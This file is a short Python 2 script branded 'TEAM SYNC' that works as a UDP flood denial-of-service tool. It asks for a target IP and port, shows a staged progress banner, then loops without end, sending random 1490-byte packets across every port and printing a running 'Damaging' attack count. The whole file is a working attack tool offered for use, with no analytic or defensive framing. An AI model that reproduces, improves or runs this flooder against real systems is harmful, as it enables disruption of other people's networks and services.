print ("\033[93m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


##############
###############

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet SYNC")
print
print "Author   : TEAM SYNC"
print "Github   : github.com/T3AmSyNc"
print "Telegram : t.me/T3aMsYnC"
print "Takeover The Whole Community"
print "Version : 2.0"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[96m")
os.system("figlet Sync Attack")
print(" May Allah Bless You ")
print ("\033[92m")
print "[SERVER        ] 0% "
time.sleep(2)
print "[KNOWLEDGE     ] 25%"
time.sleep(2)
print "[BASED         ] 50%"
time.sleep(2)
print "[TEAM SYNC     ] 75%"
time.sleep(2)
print "[WE ARE HERE TO TAKE OVER] 100%"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Damaging %s with port %s attack count:%s"%(ip,port,sent)
     if port == 65534:
       port = 1

